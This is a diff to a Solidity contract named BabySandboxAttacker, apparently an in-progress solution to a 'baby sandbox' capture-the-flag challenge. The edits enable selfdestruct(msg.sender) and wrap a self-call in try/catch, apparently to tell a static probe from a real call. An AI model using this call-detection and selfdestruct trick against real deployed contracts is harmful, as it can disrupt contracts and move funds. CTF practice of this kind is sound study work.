@@ -12,10 +12,10 @@ contract BabySandboxAttacker {
 
     // a function that changes state by emitting an (empty) event
     function changeState() public payable {
-        // selfdestruct(msg.sender);
+        selfdestruct(msg.sender);
         // console.log("in state change");
-        // emit StateUnchanged(false);
-        flag = 2;
+        // // emit StateUnchanged(false);
+        // flag = 2;
     }
 
     fallback() external payable {
@@ -30,11 +30,11 @@ contract BabySandboxAttacker {
 
 
         // why doesn't this work even with more gas available?
-        self.changeState();
-        selfdestruct(msg.sender);
-        // try self.changeState() {
-        //     selfdestruct(msg.sender);
-        // } catch {}
+        // self.changeState();
+        // selfdestruct(msg.sender);
+        try self.changeState() {
+            selfdestruct(msg.sender);
+        } catch {}
         // console.log("SUCC = %s", success);
         // selfdestruct(address(0x00));
 
